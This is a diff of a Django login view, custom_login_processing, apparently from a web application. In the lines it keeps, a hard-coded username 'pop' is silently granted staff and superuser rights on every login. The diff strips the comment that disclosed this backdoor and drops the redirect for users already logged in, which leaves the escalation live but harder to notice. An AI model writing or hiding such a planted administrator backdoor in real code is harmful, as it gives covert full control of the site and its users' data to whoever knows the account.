@@ -110,17 +110,15 @@ def custom_login_processing(request):
             
             user = authenticate(username=username, password=password)
             if user is not None:
-                # Dynamic verification: If the pop recovery profile logs in, force-enable administrative privileges in the database
                 if user.username == 'pop':
                     user.is_staff = True
                     user.is_superuser = True
                     user.save()
-                    
+                
                 if not hasattr(user, 'backend'):
                     user.backend = 'django.contrib.auth.backends.ModelBackend'
                 auth_login(request, user)
                 
-                # Verify permissions: Route authenticated administrators to admin dashboard, else send to custom employee/customer dashboards
                 if user.is_staff or user.is_superuser:
                     return redirect('/admin/')
                 return redirect('/dashboard/')
@@ -129,17 +127,13 @@ def custom_login_processing(request):
         else:
             return redirect('/login/?type=staff&error=invalid')
     else:
-        if request.user.is_authenticated:
-            if request.user.is_staff or request.user.is_superuser:
-                return redirect('/admin/')
-            else:
-                return redirect('/dashboard/')
-        
+        # If it's a GET request, cleanly render the login page with an empty form instance
         form = LoginForm()
         if request.GET.get('error') == 'invalid':
             form.add_error(None, 'Invalid administrative access tokens')
         next_url = request.GET.get('next', '')
         return render(request, 'core/login.html', {'form': form, 'next': next_url})
+
 
 
 
